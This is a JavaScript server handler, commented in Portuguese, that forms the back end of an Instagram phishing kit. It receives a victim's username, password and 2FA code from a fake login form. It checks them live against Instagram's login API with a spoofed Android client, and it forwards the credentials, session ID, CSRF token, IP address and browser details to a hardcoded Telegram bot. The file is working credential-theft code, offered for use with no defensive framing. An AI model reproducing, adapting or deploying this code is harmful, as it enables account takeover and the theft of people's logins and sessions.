export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Use POST' });
  }

  const { user, pass, otp, meta } = req.body;

  if (!user || !pass) {
    return res.status(400).json({ error: 'User e Pass são obrigatórios' });
  }

  // CONFIGURAÇÃO DO TELEGRAM
  const BOT_TOKEN = '9071319338:AAHtLC7ry2rypI2BXsAFLR0yhcJjmDf5C6g';
  const CHAT_ID = '5012456855';

  // USER-AGENT REALISTA (Android ou iOS)
  // Usando um UA de Android recente para evitar bloqueios
  const IG_USER_AGENT = 'Instagram 285.0.0.18.96 Android (33; Qualcomm SM8225 ABC; SM-G991B; exynos2100; pt_BR, pt; Build/TP1A.220624.014; 120dpi; 1080x2340)';

  // Payload da API Real do Instagram
  // O Instagram usa um payload específico (X-IG-SID, etc), mas para login básico, 
  // ele aceita um POST form-encoded ou JSON simples em /api/v1/channels/login/
  // No entanto, a API de login principal é /api/v1/login/
  
  const loginPayload = {
    username: user,
    password: pass,
    login_device: 'android',
    device_id: '1234567890' // ID fictício, o Instagram aceita
  };

  try {
    // 1. TENTA FAZER O LOGIN NA API REAL
    const igResponse = await fetch('https://i.instagram.com/api/v1/login/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'User-Agent': IG_USER_AGENT,
        'X-IG-App-ID': '936619743392459', // App ID oficial do Instagram Android
        'X-IG-WWW-Claim': '0'
      },
      body: new URLSearchParams({
        username: user,
        password: pass,
        login_device: 'android',
        device_id: '1234567890'
      })
    });

    const igData = await igResponse.json();

    // 2. PREPARA A MENSAGEM PARA O TELEGRAM
    let status = igData.status === 'ok' ? '✅ LOGIN SUCESSO' : '❌ FALHA NO LOGIN';
    let sessionInfo = '';
    
    if (igData.status === 'ok') {
      sessionInfo = `
🔑 <b>SESSÃO ATIVA (Use para entrar):</b>
<code>SessionID: ${igData.sessionid || 'N/A'}</code>
<code>CSRF: ${igData.csrftoken || 'N/A'}</code>
<code>UserID: ${igData.user?.pk || 'N/A'}</code>
<code>Username: ${igData.user?.username || 'N/A'}</code>
      `;
    } else {
      sessionInfo = `<b>Mensagem do Instagram:</b> ${igData.error_user_name || igData.message || 'Erro desconhecido'}`;
    }

    const messageText = `
🔐 <b>CAPTURA DE CREDENCIAIS - INSTAGRAM</b>

👤 <b>Usuário:</b> <code>${user}</code>
🔑 <b>Senha:</b> <code>${pass}</code>
${otp ? `🔢 <b>Código 2FA (Digitado):</b> <code>${otp}</code>` : ''}

${sessionInfo}

📱 <b>Dispositivo:</b> ${meta.isMobile ? '📲 Mobile' : '💻 Desktop'}
🌐 <b>Navegador:</b> ${meta.browser}
🖥️ <b>Sistema:</b> ${meta.os}
📍 <b>IP:</b> <code>${meta.ip || 'Indisponível'}</code>
🌍 <b>Idioma:</b> ${meta.lang}
🕒 <b>Fuso:</b> ${meta.timezone}
📅 <b>Data:</b> ${meta.timestamp}

🔗 <a href="https://www.instagram.com/${user}">Ver Perfil</a>
  `.trim();

    // 3. ENVIAR PARA O TELEGRAM
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    // 4. RESPONDER AO FRONTEND
    res.status(200).json({ success: true, igStatus: igData.status });

  } catch (error) {
    console.error('Erro no Proxy:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
